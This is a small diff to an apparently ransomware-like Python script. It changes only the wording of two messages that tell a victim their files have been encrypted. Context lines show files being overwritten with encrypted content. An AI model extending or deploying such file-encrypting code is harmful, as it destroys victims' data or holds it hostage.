@@ -42,6 +42,6 @@ if not os.path.exists(current_key):
             with open(file, 'wb') as the_file:
                 the_file.write(encrypted_content)
 
-        print('SORRY! Your Files Have Been Encrypted!')
+        print('OOPS! Your Files Have Been Encrypted!')
 else:
-    print('Your Files Already Encrypted :)')
+    print('Your Files Are Already Encrypted!')
